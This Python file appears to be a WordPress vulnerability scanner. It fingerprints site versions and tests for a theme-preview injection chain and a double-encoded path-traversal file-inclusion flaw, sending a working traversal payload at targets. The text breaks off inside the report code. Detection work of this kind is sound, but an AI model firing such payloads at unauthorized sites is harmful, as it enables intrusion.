#!/usr/bin/env python3
"""
WordPress-Vulns â€” WordPress Dual Critical Vulnerability Scanner
===============================================================

Detects TWO critical WordPress vulnerabilities in a single non-invasive scan:

  1. Click2Shell  (Theme Preview Injection â†’ RCE chain, WordPress < 7.1.1)
     Crafted /wp-admin/theme-install.php URL installs an attacker-selected theme
     from the WP catalog without an administrator pressing Install/Activate
     (selector injection in wp-admin/js/theme.js). Chains with vulnerable themes
     (e.g. mobile-repair-zone 2.5.4) for unauthenticated RCE via the Customizer.
     Core fix: WordPress 7.1.1 (changeset 63664, $.escapeSelector()).

  2. CVE-2026-87902  (Encoded Path Traversal â†’ Local PHP File Inclusion, CVSS 9.2)
     Double-encoded path traversal in WordPress's page-template resolution
     (get_page_template / locate_template) allows inclusion of arbitrary PHP
     files outside the theme directory â€” no authentication required.
     Payload: /?page_id=N&pagename=templates%252F%252E%252E%252F...%252Findex
     Core fix: WordPress 7.1.2.
     Detection: 3-request passive behavioral fingerprint (no file inclusion).

THIS TOOL:
  CHECKER (default) â€” fully NON-INVASIVE.  Only passive HTTP GET requests to
  public endpoints. No exploitation, no writes, no auth attempts.
  Determines: WordPress version, Click2Shell exposure, CVE-2026-87902 exposure,
  and presence of the mobile-repair-zone chain theme.

  POC (--poc) â€” generates an HTML page for the Click2Shell chain.
  NOTE: requires an AUTHENTICATED ADMINISTRATOR to visit the page.
  Use only on systems you own or are authorized to test.

Author:  CronUp Cybersecurity (https://github.com/CronUp/WordPress-Vulns)
License: MIT (see LICENSE). Open source.
Warning: For AUTHORIZED testing only. You are responsible for scope/authorization.
"""

import argparse
import csv
import html as html_lib
import ipaddress
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from typing import Optional
from urllib.parse import urlparse

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    sys.exit("[!] Missing dependency 'requests'. Run: pip install -r requirements.txt")

try:
    from colorama import just_fix_windows_console
    _COLORAMA = True
except ImportError:
    _COLORAMA = False


# --------------------------------------------------------------------------- #
# Console colors
# --------------------------------------------------------------------------- #
class C:
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"; BLUE = "\033[94m"
    MAGENTA = "\033[95m"; CYAN = "\033[96m"; WHITE = "\033[97m"
    BOLD = "\033[1m"; DIM = "\033[2m"; RESET = "\033[0m"


USE_COLOR = True


def paint(text, *codes):
    if not USE_COLOR or not codes:
        return text
    return "".join(codes) + text + C.RESET


def red(t): return paint(t, C.RED)
def green(t): return paint(t, C.GREEN)
def yellow(t): return paint(t, C.YELLOW)
def cyan(t): return paint(t, C.CYAN)
def magenta(t): return paint(t, C.MAGENTA)
def bold(t): return paint(t, C.BOLD)
def dim(t): return paint(t, C.DIM)


# --------------------------------------------------------------------------- #
# Constants
# --------------------------------------------------------------------------- #
C2S_FIXED_VERSION = (7, 1, 1)   # Click2Shell: fixed in WordPress 7.1.1
PT_FIXED_VERSION  = (7, 1, 2)   # CVE-2026-87902: fixed in WordPress 7.1.2

CHAIN_THEME = "mobile-repair-zone"

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0 Safari/537.36 C2S-Plus/1.0"
)
REQUEST_TIMEOUT = 20
POLITE_DELAY = 0.0

# CVE-2026-87902 â€” double-encoded path-traversal components.
# First URL decode: %25 -> %, so %252F -> %2F, %252E -> %2E
# WordPress then URL-decodes again: %2F -> /, %2E -> .
# Result: templates/../../../index  ->  wp-content/index.php (empty file)
_PT_SEP   = "%252F"           # %2F -> /
_PT_DOT   = "%252E%252E"      # %2E%2E -> ..
_PT_3UP   = f"{_PT_SEP}{_PT_DOT}" * 3   # /%2E%2E repeated 3 times
PT_PAYLOAD = f"templates{_PT_3UP}{_PT_SEP}index"
# Control: same traversal but targeting a guaranteed-nonexistent file name.
PT_CONTROL = f"templates{_PT_3UP}{_PT_SEP}nonexistent_c2splus_ctrl"

# WordPress page IDs to probe (in order of likelihood).
PT_PAGE_IDS = [2, 1, 3, 4, 5]


# --------------------------------------------------------------------------- #
# Regex patterns
# --------------------------------------------------------------------------- #
RE_META_GENERATOR = re.compile(
    r'<meta\s+name=["\']generator["\'][^>]*content=["\'][^"\']*WordPress\s+'
    r'([0-9]+\.[0-9]+(?:\.[0-9]+)?)',
    re.IGNORECASE,
)
RE_GENERIC_WP_VERSION = re.compile(
    r"WordPress\s+([0-9]+\.[0-9]+(?:\.[0-9]+)?)", re.IGNORECASE
)
RE_RSS_GENERATOR = re.compile(
    r"<generator[^>]*>\s*https?://wordpress\.org/\?v="
    r"([0-9]+\.[0-9]+(?:\.[0-9]+)?)\s*</generator>",
    re.IGNORECASE,
)
RE_README_VERSION = re.compile(
    r"Version\s+([0-9]+\.[0-9]+(?:\.[0-9]+)?)", re.IGNORECASE
)
# WordPress CORE asset ?ver= tags (theme/plugin/jQuery assets excluded).
RE_WP_VERSION_VER = re.compile(
    r"(?:"
    r"wp-includes/js/wp-embed[^\"'\s>]*|"
    r"wp-includes/css/dist/[^\"'\s>]*|"
    r"wp-includes/js/dist/(?!vendor/)[^\"'\s>]*|"
    r"wp-admin/(?:css|js)/[^\"'\s>]*"
    r")[?&](?:v|ver|version)=([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
    re.IGNORECASE,
)
RE_WP_INDICATOR = re.compile(
    r"wp-(?:content|includes|admin|json|login|cron)", re.IGNORECASE
)
RE_THEME_VERSION = re.compile(
    r"Version:\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)", re.IGNORECASE
)

WAF_CHALLENGE_HINTS = (
    "just a moment", "cf-chl-", "__cf_chl", "cf-browser-verification",
    "enable javascript and cookies", "attention required",
    "captcha-delivery", "access denied",
)


def extract_wp_core_versions(html: str) -> set:
    return set(RE_WP_VERSION_VER.findall(html))


def detect_wp_base_paths(body: str) -> list:
    found = set()
    for m in re.finditer(
        r'([^\s"\'<>()]+)/(?:wp-includes|wp-content|wp-admin|wp-json)/',
        body, re.IGNORECASE,
    ):
        token = m.group(1)
        if token.startswith("//"):
            p = urlparse("http:" + token).path
        elif "://" in token:
            p = urlparse(token).path
        else:
            p = token
        found.add(p.rstrip("/"))
    return sorted(found, key=lambda p: (p == "", len(p)))


def is_waf_challenge(html: str) -> bool:
    low = html[:8000].lower()
    return any(hint in low for hint in WAF_CHALLENGE_HINTS)


# --------------------------------------------------------------------------- #
# Data model
# --------------------------------------------------------------------------- #
@dataclass
class Detection:
    """Scan result for a single target."""

    target: str
    is_wordpress: bool = False
    version: Optional[str] = None
    version_source: Optional[str] = None

    # --- CVE 1: Click2Shell (WordPress < 7.1.1) ---
    vulnerable_click2shell: bool = False
    chain_theme_installed: bool = False
    chain_theme_version: Optional[str] = None

    # --- CVE 2: CVE-2026-87902 (WordPress < 7.1.2) ---
    vulnerable_pathtrav: bool = False
    pathtrav_checked: bool = False   # True = behavioral check ran to completion
    pathtrav_page_id: Optional[int] = None

    # --- General ---
    setup_exposed: bool = False
    blocked: bool = False
    offline: bool = False
    http_status: int = 0
    error: Optional[str] = None
    evidence: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return asdict(self)

    @property
    def pathtrav_vuln(self) -> bool:
        """True if CVE-2026-87902 label shows VULNERABLE â€” behavioral confirm OR version < 7.1.2."""
        if not self.is_wordpress or self.blocked or self.offline or self.error:
            return False
        if self.vulnerable_pathtrav:
            return True
        vt = version_tuple(self.version)
        return vt is not None and is_older(vt, PT_FIXED_VERSION)

    @property
    def any_critical(self) -> bool:
        return self.vulnerable_click2shell or self.pathtrav_vuln


# --------------------------------------------------------------------------- #
# URL / host helpers
# --------------------------------------------------------------------------- #
VALID_HOST_RE = re.compile(r"^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?$")


def is_valid_host(host: str) -> bool:
    host = (host or "").strip().rstrip(".").lower()
    if not host or len(host) > 253:
        return False
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        pass
    labels = host.split(".")
    if len(labels) < 1 or any(not lbl for lbl in labels):
        return False
    for label in labels:
        if len(label) > 63 or not VALID_HOST_RE.match(label):
            return False
    return True


def normalize_url(raw: str, prefer_https: bool = False) -> str:
    s = (raw or "").strip()
    if not s or s.lstrip().startswith("#"):
        return ""
    s = s.strip().strip('"').strip("'").strip("<>").strip()
    if not s:
        return ""
    if "://" not in s:
        s = "http://" + s
    try:
        p = urlparse(s)
    except ValueError:
        return ""
    scheme = (p.scheme or "http").lower()
    if scheme not in ("http", "https"):
        return ""
    host = (p.hostname or "").lower()
    if host and any(ord(ch) > 127 for ch in host):
        try:
            host = host.encode("idna").decode("ascii")
        except (UnicodeError, ValueError):
            return ""
    if not is_valid_host(host):
        return ""
    port = f":{p.port}" if p.port else ""
    return f"{scheme}://{host}{port}"


def host_key(target: str) -> str:
    p = urlparse(target)
    port = f":{p.port}" if p.port else ""
    return f"{(p.hostname or '').lower()}{port}"


def load_targets(raw_entries, prefer_https: bool = False):
    valid: dict = {}
    skipped: list = []
    total = 0
    for raw in raw_entries:
        s = (raw or "").strip()
        if not s or s.lstrip().startswith("#"):
            continue
        total += 1
        norm = normalize_url(s, prefer_https)
        if not norm:
            skipped.append((s, "invalid host/URL"))
            continue
        key = host_key(norm)
        if key in valid:
            existing = valid[key]
            if prefer_https and norm.startswith("https://") and not existing.startswith("https://"):
                valid[key] = norm
            skipped.append((s, "duplicate"))
            continue
        valid[key] = norm
    stats = {
        "total": total,
        "valid": len(valid),
        "invalid": sum(1 for _, r in skipped if r == "invalid host/URL"),
        "duplicates": sum(1 for _, r in skipped if r == "duplicate"),
        "skipped": skipped,
    }
    return list(valid.values()), stats


def version_tuple(v: Optional[str]):
    if not v:
        return None
    parts = re.findall(r"\d+", v)
    if not parts:
        return None
    try:
        return tuple(int(x) for x in parts)
    except ValueError:
        return None


def is_older(candidate, baseline) -> bool:
    if candidate is None:
        return False
    cand = candidate + (0,) * (3 - len(candidate))
    base = baseline + (0,) * (3 - len(baseline))
    return cand < base


# --------------------------------------------------------------------------- #
# HTTP session / fetch
# --------------------------------------------------------------------------- #
def build_session(impersonate: bool = False):
    if impersonate:
        try:
            from curl_cffi import requests as cffi_requests
            return cffi_requests.Session(impersonate="chrome")
        except Exception:
            pass
    s = requests.Session()
    s.headers.update({"User-Agent": USER_AGENT, "Accept": "*/*", "Connection": "close"})
    # Each thread gets its own session with a minimal pool.
    # Connection: close forces TCP teardown after each response, releasing
    # ephemeral ports immediately â€” critical on Windows with high thread counts.
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=1,
        pool_maxsize=1,
        max_retries=0,
    )
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s


def _timeout(timeout: int) -> tuple:
    """Split into (connect_timeout, read_timeout) to avoid silent hangs."""
    return (min(5, timeout), timeout)


def fetch(session, url: str, timeout: int, verify: bool):
    if POLITE_DELAY > 0:
        time.sleep(POLITE_DELAY)
    try:
        return session.get(
            url, timeout=_timeout(timeout), verify=verify, allow_redirects=True
        )
    except Exception:
        return None


# --------------------------------------------------------------------------- #
# CVE-2026-87902 â€” passive behavioral detection
# --------------------------------------------------------------------------- #
def check_pathtrav(session, base: str, timeout: int, verify: bool) -> tuple:
    """
    Three-request passive behavioral fingerprint for CVE-2026-87902.

    Returns (vulnerable: bool, page_id: int|None, evidence: dict).

    Method (per Hadrian research):
      1. Baseline  â€” real page at ?page_id=N  (200, substantial content)
      2. Control   â€” traversal to guaranteed-nonexistent file (should NOT match test)
      3. Test      â€” traversal targeting wp-content/index.php (empty PHP stub)

    Positive indicator: test returns HTTP 200 with body significantly shorter
    than baseline, while control does NOT exhibit the same minimal-response
    behavior â€” ruling out site-wide caching/stripping artifacts.
    """
    for page_id in PT_PAGE_IDS:
        baseline_url = f"{base}/?page_id={page_id}"
        r_base = fetch(session, baseline_url, timeout, verify)
        if r_base is None:
            break  # site not responding â€” no point trying more page IDs
        if r_base.status_code != 200:
            continue
        baseline_len = len(r_base.text.strip())
        if baseline_len < 200:
            continue

        ctrl_url = f"{base}/?page_id={page_id}&pagename={PT_CONTROL}"
        r_ctrl = fetch(session, ctrl_url, timeout, verify)
        if r_ctrl is None:
            break

        test_url = f"{base}/?page_id={page_id}&pagename={PT_PAYLOAD}"
        r_test = fetch(session, test_url, timeout, verify)
        if r_test is None:
            break

        # The check reached completion for this page_id â€” result is definitive.
        ctrl_status = r_ctrl.status_code
        ctrl_len    = len(r_ctrl.text.strip())
        test_len    = len(r_test.text.strip())

        # Signal 1 (strongest): traversal finds the file (200) but non-existent
        # control path returns a non-200 (typically 404).
        status_signal = r_test.status_code == 200 and ctrl_status not in (200,)

        # Signal 2: both return 200 but test content is dramatically shorter than
        # baseline AND control â€” template was empty so page body is missing.
        size_signal = (
            r_test.status_code == 200
            and ctrl_status == 200
            and test_len < baseline_len * 0.45
            and test_len < ctrl_len * 0.80
        )

        evidence = {
            "page_id": page_id,
            "detection": "status" if status_signal else ("size" if size_signal else "none"),
            "baseline": {"url": baseline_url, "status": 200, "length": baseline_len},
            "control":  {"url": ctrl_url,  "status": ctrl_status, "length": ctrl_len},
            "test":     {"url": test_url,  "status": r_test.status_code, "length": test_len},
        }

        if status_signal or size_signal:
            return True, page_id, evidence, True   # vulnerable, checked

        # Completed without finding vulnerability â€” result is trustworthy.
        return False, None, evidence, True

    # Loop exhausted without completing a full 3-request cycle (timeouts, 403s,
    # no valid page IDs) â€” result is inconclusive, NOT a clean "not vulnerable".
    return False, None, {}, False


# --------------------------------------------------------------------------- #
# Per-target scan
# --------------------------------------------------------------------------- #
def scan_target(
    target: str,
    verify: bool,
    timeout: int,
    check_chain: bool,
    check_pt: bool,
    impersonate: bool = False,
) -> Detection:
    base = normalize_url(target)
    det = Detection(target=base)
    if not base:
        det.error = "invalid target"
        return det

    session = build_session(impersonate)
    candidates: dict = {}
    strong = 0
    weak = 0
    detected_path = ""

    # ------------------------------------------------------------------ #
    # Phase 1 â€” homepage: generator meta, core asset ?ver=, WP path hints
    # ------------------------------------------------------------------ #
    try:
        resp = session.get(
            base + "/", timeout=_timeout(timeout), verify=verify, allow_redirects=True
        )
    except Exception as e:
        name = type(e).__name__.lower()
        if "ssl" in name or "certificate" in name:
            det.error = "TLS error (use --insecure)"
        elif any(k in name for k in ("timeout", "connect", "dns", "gai", "resolve", "refused")):
            det.offline = True
            det.evidence["offline"] = type(e).__name__
        else:
            det.error = str(e)
        session.close()
        return det

    det.http_status = resp.status_code
    body = resp.text[:400000]

    if is_waf_challenge(body):
        det.blocked = True
        det.evidence["waf_challenge"] = True
        session.close()
        return det

    weak = len(set(m.group(0).lower() for m in RE_WP_INDICATOR.finditer(body)))
    m = RE_META_GENERATOR.search(body)
    if m:
        strong += 1
        candidates.setdefault("meta", m.group(1))
    candidates.setdefault("asset", set()).update(extract_wp_core_versions(body))
    wp_paths = detect_wp_base_paths(body) or [""]
    if "" not in wp_paths:
        wp_paths.append("")

    # ------------------------------------------------------------------ #
    # Phase 2 â€” low-risk public endpoints: feed, OPML, REST API
    # ------------------------------------------------------------------ #
    for wp_path in wp_paths:
        wp_base = base + wp_path

        r = fetch(session, wp_base + "/feed/", timeout, verify)
        if r is not None and r.status_code == 200:
            mm = RE_RSS_GENERATOR.search(r.text[:50000])
            if mm:
                strong += 1
                candidates.setdefault("feed", mm.group(1))

        r = fetch(session, wp_base + "/wp-links-opml.php", timeout, verify)
        if r is not None and r.status_code == 200:
            mm = RE_RSS_GENERATOR.search(r.text[:20000])
            if mm:
                strong += 1
                candidates.setdefault("opml", mm.group(1))

        r = fetch(session, wp_base + "/wp-json/", timeout, verify)
        if r is not None and r.status_code == 200 and (
            "namespaces" in r.text[:2000] or "routes" in r.text[:2000]
        ):
            strong += 1

        if strong >= 1:
            detected_path = wp_path
            break

    # ------------------------------------------------------------------ #
    # Phase 3 â€” sensitive files (only when version/confirmation still needed)
    # ------------------------------------------------------------------ #
    have_version = bool(
        candidates.get("meta") or candidates.get("feed")
        or candidates.get("opml") or candidates.get("asset")
    )
    confirmed = (strong >= 1) or (weak >= 2)
    has_hint = (weak >= 1) or (strong >= 1)

    if has_hint and not (have_version and confirmed):
        for wp_path in wp_paths:
            wp_base = base + wp_path

            r = fetch(session, wp_base + "/readme.html", timeout, verify)
            if r is not None and r.status_code == 200:
                mm = RE_README_VERSION.search(r.text[:20000])
                if mm:
                    candidates["readme"] = mm.group(1)
                if "wordpress" in r.text[:2000].lower():
                    strong += 1

            r = fetch(session, wp_base + "/xmlrpc.php", timeout, verify)
            if r is not None and r.status_code in (200, 405):
                txt = r.text[:2000].lower()
                if "xmlrpc" in txt or "xml-rpc" in txt or "system.listmethods" in txt:
                    strong += 1

            r = fetch(session, wp_base + "/wp-login.php", timeout, verify)
            if r is not None and r.status_code == 200:
                lbody = r.text[:200000]
                if "wp-submit" in lbody or "user_login" in lbody:
                    strong += 1
                candidates.setdefault("login_asset", set()).update(
                    extract_wp_core_versions(lbody)
                )

            r = fetch(session, wp_base + "/wp-admin/install.php", timeout, verify)
            if r is not None and r.status_code == 200:
                ibody = r.text[:30000]
                ilow = ibody.lower()
                if 'name="weblog_title"' in ibody or "install wordpress" in ilow:
                    det.setup_exposed = True
                mm = RE_GENERIC_WP_VERSION.search(ibody)
                if mm:
                    candidates.setdefault("install", mm.group(1))
                if "already installed" in ilow:
                    strong += 1

            if strong >= 1:
                detected_path = wp_path
                break

    det.is_wordpress = (strong >= 1) or (weak >= 2)

    # Resolve best version candidate
    version = None
    source = None
    if det.is_wordpress:
        for key, src_label in [
            ("readme", "readme.html"),
            ("meta", "generator meta"),
            ("feed", "RSS feed"),
            ("opml", "wp-links-opml.php"),
            ("install", "wp-admin/install.php"),
        ]:
            if key in candidates:
                version, source = candidates[key], src_label
                break
        if version is None:
            asset_versions = list(candidates.get("asset", set())) + list(
                candidates.get("login_asset", set())
            )
            if asset_versions:
                version = max(set(asset_versions), key=asset_versions.count)
                source = "asset ?ver="

    det.version = version
    det.version_source = source
    det.evidence = {
        k: (sorted(v) if isinstance(v, set) else v) for k, v in candidates.items()
    }
    det.evidence["wp_signals"] = {"strong": strong, "weak": weak}
    det.evidence["wp_path"] = detected_path

    # ---- CVE 1: Click2Shell (< 7.1.1) ----
    det.vulnerable_click2shell = det.is_wordpress and is_older(
        version_tuple(version), C2S_FIXED_VERSION
    )

    # Chain theme (mobile-repair-zone) â€” only meaningful when Click2Shell exposed
    if check_chain and det.vulnerable_click2shell:
        theme_url = (
            base + detected_path
            + f"/wp-content/themes/{CHAIN_THEME}/style.css"
        )
        r = fetch(session, theme_url, timeout, verify)
        if r is not None and r.status_code == 200:
            det.chain_theme_installed = True
            m = RE_THEME_VERSION.search(r.text[:4000])
            if m:
                det.chain_theme_version = m.group(1)
            det.evidence["theme_style_css"] = {
                "url": theme_url, "status": r.status_code,
            }

    # ---- CVE 2: CVE-2026-87902 (< 7.1.2) â€” behavioral fingerprint ----
    if check_pt and det.is_wordpress:
        vt = version_tuple(version)
        # Skip only when version is definitively >= 7.1.2; unknown version -> check anyway
        if vt is None or is_older(vt, PT_FIXED_VERSION):
            vuln_pt, pt_page_id, pt_ev, pt_checked = check_pathtrav(
                session, base + detected_path, timeout, verify
            )
            det.vulnerable_pathtrav = vuln_pt
            det.pathtrav_checked    = pt_checked
            det.pathtrav_page_id    = pt_page_id
            det.evidence["pathtrav"] = pt_ev

    session.close()
    return det


# --------------------------------------------------------------------------- #
# Console table
# --------------------------------------------------------------------------- #
def _fmt(value, width, *codes):
    return paint(f"{value:<{width}}", *codes)


def render_progress(done: int, total: int, width: int = 26) -> str:
    if total <= 0:
        pct, filled = 100, width
    else:
        pct = int(done * 100 / total)
        filled = int(width * done / total)
    bar = cyan("#" * filled) + dim("." * (width - filled))
    tw = len(str(total))
    return f"[*] Progress: {done:>{tw}}/{total} ({pct:3d}%) [{bar}]"


def _risk_label(det: Detection, vuln: bool) -> tuple:
    """Generic risk label used for Click2Shell."""
    if det.error:   return "ERR",       (C.RED, C.BOLD)
    if det.blocked: return "BLOCKED",   (C.YELLOW, C.BOLD)
    if det.offline: return "OFFLINE",   (C.MAGENTA, C.BOLD)
    if vuln:        return "VULNERABLE",(C.RED, C.BOLD)
    if det.is_wordpress and det.version:
        return "patched", (C.GREEN,)
    if det.is_wordpress:
        return "UNKNOWN", (C.YELLOW,)
    return "-", (C.DIM,)


def _pathtrav_label(det: Detection) -> tuple:
    """
    Risk label for CVE-2026-87902 â€” version-aware and check-aware.

    patched      = version >= 7.1.2 (confirmed safe by version)
                   OR behavioral check completed and found no vulnerability
    UNCONFIRMED  = version < 7.1.2 but check couldn't complete
                   (WAF blocking ?page_id=, timeout, no valid page IDs)
    VULNERABLE   = behavioral check confirmed path traversal
    UNKNOWN      = WordPress detected but no version info
    """
    if det.error:   return "ERR",       (C.RED, C.BOLD)
    if det.blocked: return "BLOCKED",   (C.YELLOW, C.BOLD)
    if det.offline: return "OFFLINE",   (C.MAGENTA, C.BOLD)
    if not det.is_wordpress: return "-",(C.DIM,)
    if det.vulnerable_pathtrav: return "VULNERABLE", (C.RED, C.BOLD)

    vt = version_tuple(det.version)
    # Version >= 7.1.2 means patch was applied â€” no behavioral check needed.
    if vt is not None and not is_older(vt, PT_FIXED_VERSION):
        return "patched", (C.GREEN,)
    # Version < fix baseline â€” flag as vulnerable regardless of behavioral result.
    # A negative behavioral check is NOT proof of patched: caches, WAFs, or
    # theme differences can silently absorb the payload without the site being fixed.
    if vt is not None:
        return "VULNERABLE", (C.RED, C.BOLD)
    return "UNKNOWN", (C.YELLOW,)


def print_table(results: list):
    W = (36, 4, 10, 13, 14, 5, 6, 17)
    hdr = [
        _fmt("TARGET",         W[0], C.CYAN, C.BOLD),
        _fmt("WP",             W[1], C.CYAN, C.BOLD),
        _fmt("VERSION",        W[2], C.CYAN, C.BOLD),
        _fmt("CLICK2SHELL",    W[3], C.CYAN, C.BOLD),
        _fmt("CVE-2026-87902", W[4], C.CYAN, C.BOLD),
        _fmt("MRZ",            W[5], C.CYAN, C.BOLD),
        _fmt("SETUP",          W[6], C.CYAN, C.BOLD),
        _fmt("SOURCE",         W[7], C.CYAN, C.BOLD),
    ]
    print("\n" + " ".join(hdr))
    print(dim("-" * (sum(W) + len(W) - 1)))

    for d in results:
        wp_val = "?" if (d.blocked or d.offline) else ("yes" if d.is_wordpress else "no")
        wp_codes = (
            C.GREEN if d.is_wordpress
            else (C.DIM if not (d.blocked or d.offline) else C.YELLOW)
        )

        c2s_lbl, c2s_codes = _risk_label(d, d.vulnerable_click2shell)
        pt_lbl,  pt_codes  = _pathtrav_label(d)

        row = [
            _fmt(d.target,                             W[0]),
            _fmt(wp_val,                               W[1], wp_codes),
            _fmt(d.version or "-",                     W[2], C.BOLD if d.version else C.DIM),
            _fmt(c2s_lbl,                              W[3], *c2s_codes),
            _fmt(pt_lbl,                               W[4], *pt_codes),
            _fmt("Y" if d.chain_theme_installed else "-", W[5],
                 C.YELLOW if d.chain_theme_installed else C.DIM),
            _fmt("OPEN" if d.setup_exposed else "-",  W[6],
                 *((C.YELLOW, C.BOLD) if d.setup_exposed else (C.DIM,))),
            _fmt(d.version_source or "-",              W[7], C.DIM),
        ]
        print(" ".join(row))


# --------------------------------------------------------------------------- #
# HTML report
# --------------------------------------------------------------------------- #
HTML_REPORT_CSS = """
  :root {
    --bg:#f7f8fa; --card:#ffffff; --border:#e6e8eb; --text:#1a1d21;
    --muted:#6b7280; --red:#e11d48; --green:#059669; --amber:#d97706;
    --blue:#2563eb; --darkred:#9f1239; --navy:#0b2545; --slate:#64748b;
    --purple:#7c3aed;
  }
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    background:var(--bg);color:var(--text);line-height:1.5;padding:2.5rem 1.25rem}
  .wrap{max-width:1160px;margin:0 auto}
  header{margin-bottom:2rem}
  .author{color:var(--navy);font-weight:700;font-size:.78rem;text-transform:uppercase;
    letter-spacing:.14em;margin-bottom:.5rem}
  h1{font-size:1.65rem;font-weight:700;letter-spacing:-.02em}
  .meta{color:var(--muted);font-size:.85rem;margin-top:.35rem}
  .meta code{background:var(--card);border:1px solid var(--border);
    padding:.1rem .4rem;border-radius:4px}
  .summary{display:grid;grid-template-columns:repeat(auto-fit,minmax(155px,1fr));
    gap:.75rem;margin-bottom:2rem}
  .card{background:var(--card);border:1px solid var(--border);border-radius:10px;
    padding:1rem 1.1rem}
  .card .num{font-size:1.55rem;font-weight:700;letter-spacing:-.02em}
  .card .lbl{color:var(--muted);font-size:.75rem;text-transform:uppercase;letter-spacing:.05em}
  .card.red .num{color:var(--red)} .card.green .num{color:var(--green)}
  .card.amber .num{color:var(--amber)} .card.blue .num{color:var(--blue)}
  .card.darkred .num{color:var(--darkred)} .card.slate .num{color:var(--slate)}
  .card.purple .num{color:var(--purple)}
  table{width:100%;border-collapse:collapse;background:var(--card);
    border:1px solid var(--border);border-radius:10px;overflow:hidden}
  thead th{text-align:left;font-size:.72rem;text-transform:uppercase;letter-spacing:.05em;
    color:var(--muted);padding:.7rem .9rem;border-bottom:1px solid var(--border);
    background:#fbfbfc;cursor:pointer;user-select:none;white-space:nowrap}
  thead th:hover{color:var(--text)}
  thead th .arrow{color:var(--blue);margin-left:.25rem}
  tbody td{padding:.7rem .9rem;border-bottom:1px solid var(--border);font-size:.88rem}
  tbody tr:last-child td{border-bottom:0}
  tbody tr:hover{background:#fafbfc}
  td.target{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.83rem}
  .badge{display:inline-block;padding:.15rem .55rem;border-radius:999px;
    font-size:.72rem;font-weight:600;letter-spacing:.02em}
  .b-vuln{background:#fef2f2;color:var(--red)}
  .b-ok{background:#ecfdf5;color:var(--green)}
  .b-open{background:#fffbeb;color:var(--amber)}
  .b-none{background:#f3f4f6;color:var(--muted)}
  .b-err{background:#fef2f2;color:var(--red)}
  .b-offline{background:#f1f5f9;color:var(--slate)}
  .b-purple{background:#f5f3ff;color:var(--purple)}
  .muted{color:var(--muted)}
  footer{margin-top:1.75rem;color:var(--muted);font-size:.78rem}
"""

SORT_TABLE_JS = """
function sortTable(col){
  var t=document.getElementById('results');if(!t)return;
  var tb=t.tBodies[0],rows=Array.prototype.slice.call(tb.rows);
  var asc=(t.dataset.col==col)?!(t.dataset.asc=='true'):true;
  rows.sort(function(a,b){
    var x=a.cells[col].textContent.trim(),y=b.cells[col].textContent.trim();
    return x.localeCompare(y,undefined,{numeric:true,sensitivity:'base'});
  });
  if(!asc)rows.reverse();
  rows.forEach(function(r){tb.appendChild(r);});
  t.dataset.col=col;t.dataset.asc=asc;
  var ths=t.querySelectorAll('thead th');
  ths.forEach(function(th,i){
    var lbl=th.getAttribute('data-label')||th.textContent;
    th.innerHTML=lbl+(i===col?'<span class="arrow">'+(asc?'â–²':'â–¼')+'</span>':'');
  });
}
"""


def generate_html_report(
    results: list,
    out_path: str,
    stats: Optional[dict] = None,
    skipped: Optional[list] = None,
):
    stats = stats or {}
    n_wp    = sum(1 for d in results if d.is_wordpress)
    n_c2s   = sum(1 for d in results if d.vulnerable_click2shell)
    n_pt    = sum(1 for d in results if d.pathtrav_vuln)
    n_both  = sum(1 for d in results if d.vulnerable_click2shell and d.pathtrav_vuln)
    n_mrz   = sum(1 for d in results if d.chain_theme_installed)
    n_blk   = sum(1 for d in results if d.blocked)
    n_off   = sum(1 for d in results if d.offline)

    def esc(s):
        return html_lib.escape(str(s)) if s is not None else ""

    def risk_badge(det: Detection, vuln: bool) -> str:
        if det.error:   return '<span class="badge b-err">ERROR</span>'
        if det.blocked: return '<span class="badge b-open">BLOCKED</span>'
        if det.offline: return '<span class="badge b-offline">OFFLINE</span>'
        if vuln:        return '<span class="badge b-vuln">VULNERABLE</span>'
        if det.is_wordpress and det.version:
            return '<span class="badge b-ok">patched</span>'
        if det.is_wordpress:
            return '<span class="badge b-open">UNKNOWN</span>'
        return '<span class="badge b-none">n/a</span>'

    def pathtrav_badge(det: Detection) -> str:
        if det.error:   return '<span class="badge b-err">ERROR</span>'
        if det.blocked: return '<span class="badge b-open">BLOCKED</span>'
        if det.offline: return '<span class="badge b-offline">OFFLINE</span>'
        if not det.is_wordpress: return '<span class="badge b-none">n/a</span>'
        if det.vulnerable_pathtrav:
            return '<span class="badge b-vuln">VULNERABLE</span>'
        vt = version_tuple(det.version)
        if vt is not None and not is_older(vt, PT_FIXED_VERSION):
            return '<span class="badge b-ok">patched</span>'
        if vt is not None:
            return '<span class="badge b-vuln">VULNERABLE</span>'
        return '<span class="badge b-open">UNKNOWN</span>'

    rows = []
    for d in results:
        wp   = "?" if (d.blocked or d.offline) else ("yes" if d.is_wordpress else "no")
        mrz  = ('<span class="badge b-purple">installed</span>'
                if d.chain_theme_installed else '<span class="muted">-</span>')
        setup = ('<span class="badge b-open">OPEN</span>'
                 if d.setup_exposed else '<span class="muted">-</span>')
        ver = f"<strong>{esc(d.version)}</strong>" if d.version else esc("-")
        rows.append(
            f"<tr>"
            f"<td class='target'>{esc(d.target)}</td>"
            f"<td>{esc(wp)}</td>"
            f"<td>{ver}</td>"
            f"<td>{risk_badge(d, d.vulnerable_click2shell)}</td>"
            f"<td>{pathtrav_badge(d)}</td>"
            f"<td>{mrz}</td>"
            f"<td>{setup}</td>"
            f"<td class='muted'>{esc(d.version_source or '-')}</td>"
            f"</tr>"
        )

    skipped_rows = ""
    if skipped:
        items = "".join(
            f"<li>{esc(raw)} <span class='muted'>â†’ {esc(reason)}</span></li>"
